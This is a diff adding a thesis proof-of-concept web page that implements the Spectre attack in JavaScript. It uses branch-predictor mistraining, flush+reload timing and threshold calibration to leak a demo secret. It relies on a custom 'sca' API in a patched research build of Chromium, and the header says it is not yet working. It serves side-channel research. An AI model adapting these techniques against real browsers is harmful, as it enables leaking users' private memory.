@@ -1,0 +1,282 @@
+ <!--
+Author: Jonathan Busch (jonathan.busch@pm.me)
+This document is a Proof-of-Concept of the Spectre attack by Kocher et al. 
+and is part of the Bachelor Thesis "Power-ups for Chromium: Facilitate Side-Channel Research".
+This code only works on Chromium versions with the following patch: TODO
+Since this Proof-of-Concept is currently not working as intended, a successful implementation is
+subject to future work.
+ -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Spectre JS PoC</title>
+    <meta http-equiv='cache-control' content='no-cache'>
+    <meta http-equiv='expires' content='0'>
+    <meta http-equiv='pragma' content='no-cache'>
+</head>
+
+
+<body>
+
+<h1>Spectre JS PoC</h1>
+
+<div class="btn-group">
+    <button type="button" id="btn_start" onclick="startAttackJS()">Start Attack</button>
+    <button type="button" id="btn_start" onclick="calcThreshold()">Calculate Threshold</button>
+</div>
+<br>
+<div class="paper-poc">
+    <button type="button" id="btn-paper-poc" onclick="paperPoc()">Run paper PoC</button>
+</div>
+<br>
+<div class="reload">
+    <button type="button" id="btn_reload" onclick="location.reload()">Reload Page</button>
+</div>
+
+<p id="leak">Leak: </p>
+
+<script>
+    /********************************************************************
+    Victim code.
+    ********************************************************************/
+    var secret_str = "The Magic Words are Squeamish Ossifrage.";
+    var text_encoder = new TextEncoder(); // always utf-8
+
+    let secret_length = new ArrayBuffer(1);
+    secret_length[0] = 4096;
+
+    var array1_addr = 0;
+    var secret_addr = 0;
+    var array2_addr = 0;
+
+    var array1 = new Uint8Array(4096);
+    var secret = new Uint8Array(4096);
+
+    var array2 = new ArrayBuffer(4096);
+    for (let i = 0; i < 256; i++) {
+        var mix_i = (((i * 167) + 13) & 255);
+        array2[mix_i] = new Uint8Array(4096);
+    }
+    array2_addr = sca.bufferAddress(array2);
+
+    for (let i = 0; i < 256; i++) {
+        var addr_i = sca.bufferAddress(array2[i].buffer);
+        sca.flush(addr_i);
+        for (let z = 0; z < 500; z++) { }
+    }
+    
+    text_encoder.encodeInto(secret_str, secret);
+
+    array1_addr = sca.bufferAddress(array1.buffer);
+    secret_addr = sca.bufferAddress(secret.buffer);
+
+
+    console.log("array1: 0x" + array1_addr.toString(16));
+    console.log("secret: 0x" + secret_addr.toString(16));
+    
+    var secret_offset = secret_addr - array1_addr;
+
+    if (secret_offset < 0) {
+        console.log("NEGATIVE OFFSET - RELOAD PAGE!")
+        console.log("Difference: " + (secret_addr - array1_addr));
+        document.getElementById("btn_start").disabled = true;
+        document.getElementById("leak").innerText = "NEGATIVE OFFSET - RELOAD PAGE!";
+    }
+
+    var temp = 0;
+
+    function victim_function(x) {
+        sca.flush(sca.bufferAddress(secret_length));
+        //for (let z = 0; z < 500; z++) { }
+        //if (parseFloat(x) / parseFloat(secret_length[0]) < 1) {
+        if (x < secret_length[0]) {
+            temp &= array2[array1[x]];
+        }
+    }
+
+    /********************************************************************
+    Analysis code
+    ********************************************************************/
+    let CACHE_HIT_THRESHOLD = 315; // Default value.
+
+    function readMemoryByte(malicious_x) {
+        let x;
+        for (let tries = 0; tries < 25; tries++) {
+
+            // Flush array2
+            for (let i = 0; i < 256; i++) {
+                var addr_i = sca.bufferAddress(array2[i].buffer);
+                sca.flush(addr_i);
+                for (let z = 0; z < 100; z++) { }
+            }
+            
+            
+            // Mistraining
+            for (let j = 1; j < 31; j++) {
+                //for (let z = 0; z < 100; z++) { }
+                x = ((j % 6) - 1) & ~0xFFFF;
+                x = (x | (x >> 16));
+                x = (x * (-malicious_x) + (1 - x) * 0);
+                victim_function(x);
+            }
+
+            // Uncomment the next line to test covert channel
+            //temp &= array2[(secret[malicious_x - secret_offset])];
+
+            let wrong = 0;
+            let wrong_delta = 0;
+            for (let i = 32; i < 127; i++) {
+                var addr_i = sca.bufferAddress(array2[i].buffer);
+                const delta = sca.reload(addr_i);
+
+                if (delta <= CACHE_HIT_THRESHOLD && i == secret[malicious_x - secret_offset]) {
+                    console.log("Found at index " + i + " after " + (tries + 1) + " tries.\nWrong: " + wrong + "/" + (i + 1) + "\nDelta: " + delta + "\nWrong Delta Avg: " + (wrong_delta / wrong));
+                    return i;
+                } 
+
+                if (delta <= CACHE_HIT_THRESHOLD) {
+                    wrong++;
+                    wrong_delta += delta;
+                }
+            }
+            //for (let z = 0; z < 1024 * 1024 * 2; z++) { }
+        }
+        return -1;
+    }
+
+    function startAttackJS() {
+        document.getElementById("leak").innerText = "Leak: ";
+        console.log("Threshold: " + CACHE_HIT_THRESHOLD);
+        var offset = secret_offset;
+
+        let misses = 0;
+        for (let i = 0; i < 40; i++) {
+            console.log("Reading malicious_x at: " + (i + offset));
+            let leaked = readMemoryByte(i + offset);
+            if (leaked == -1) {
+                misses++;
+                console.log("FAILED for byte " + i + " (Should be " + secret[i] + ")");
+                document.getElementById("leak").innerText = document.getElementById("leak").innerText + "_";
+            } else {
+                console.log(leaked > 31 && leaked < 127 ? String.fromCharCode(leaked) : '? (' + leaked + ")");
+                document.getElementById("leak").innerText = document.getElementById("leak").innerText + (leaked > 31 && leaked < 127 ? String.fromCharCode(leaked) : "?");
+            }
+        }
+    }
+
+
+
+    /********************************************************************
+    Run full attack described in the paper using power-up sca.spectre()
+    ********************************************************************/
+    function paperPoc() {
+        var res = sca.spectre();
+        console.log("Expected: " + secret_str);
+        console.log("Got: " + res);
+        document.getElementById("leak").innerText = "Paper PoC\n\nExpected: " + secret_str + "\nGot: " + res;
+    }
+
+    /********************************************************************
+    Evaluation
+    ********************************************************************/
+    function evaluate(iterations, length, dl=false) {
+        let correct = 0;
+        res = [];
+        for (var i = 0; i < iterations; i++) {
+            let test_str = "";
+            for (var j = 0; j < length; j++) {
+                test_str += getRandomLetter();
+            }
+            let leaked = sca.spectre(test_str);
+            if (leaked === test_str) {
+                correct++;
+            }
+            let eq = 0;
+            for (var j = 0; j < length; j++) {
+                if (test_str[j] === leaked[j]) {
+                    eq++;
+                }
+            }
+            res.push(eq/length);
+        }
+        if (dl) {
+            download(res, iterations + "x_" + length + "l");
+        }
+        console.log("Iterations: " + iterations);
+        console.log("Correct: " + ((correct/iterations) * 100) + "%")
+    }
+
+    function getRandomLetter() {
+        cc = Math.random() * 95 + 32;
+        return String.fromCharCode(cc);
+    }
+
+    function download(data, name) {
+        let csv = "data:text/csv;charset=utf-8,";
+        csv += "x\r\n";
+        data.forEach(function(e) {
+            csv += e + "\r\n";
+        });
+
+        var dl = encodeURI(csv);
+        var link = document.createElement("a");
+        link.setAttribute("href", dl);
+        link.setAttribute("download", name + ".csv");
+        document.body.appendChild(link);
+
+        link.click();
+    }
+
+
+
+    /********************************************************************
+    Threshold calculation
+    ********************************************************************/
+    function calcThreshold() {
+        console.log("Calculating threshold...");
+
+        const n = 1024 * 1024 * 2;
+
+        let buff_addr = sca.bufferAddress(array2[0].buffer);
+
+        let hit_sum = 0;
+        let miss_sum = 0;
+        let hit_deltas = [];
+        let miss_deltas = [];
+        let miss_min = Number.MAX_SAFE_INTEGER;
+
+        sca.flush(buff_addr);
+        for (let z = 0; z < 1000; z++) {}
+        for (let i = 0; i < n; i++) {
+            const delta = sca.flushandreload(buff_addr);
+            for (let z = 0; z < 1000; z++) {}
+            miss_deltas.push(delta);
+            miss_sum += delta;
+            if (delta < miss_min) {
+                miss_min = delta;
+            }
+        }
+
+        sca.maccess(buff_addr);
+        for (let i = 0; i < n; i++) {
+            const delta = sca.reload(buff_addr);
+            hit_deltas.push(delta);
+            hit_sum += delta;
+        }
+
+        miss_deltas.sort(function(a, b) {
+            return a - b;
+        });
+        hit_deltas.sort(function(a, b) {
+            return a - b;
+        });
+
+        console.log("Hit median: " + hit_deltas[n/2]);
+        console.log("Miss median: " + miss_deltas[n/2] + " (min: " + miss_min + ")");
+
+        CACHE_HIT_THRESHOLD = miss_min - 10; //hit_deltas[n/2]; //(hit_sum / n + miss_sum / n * 2) / 3; 
+        console.log("New Threshold: " + CACHE_HIT_THRESHOLD);
+    }
+
+
+</script>
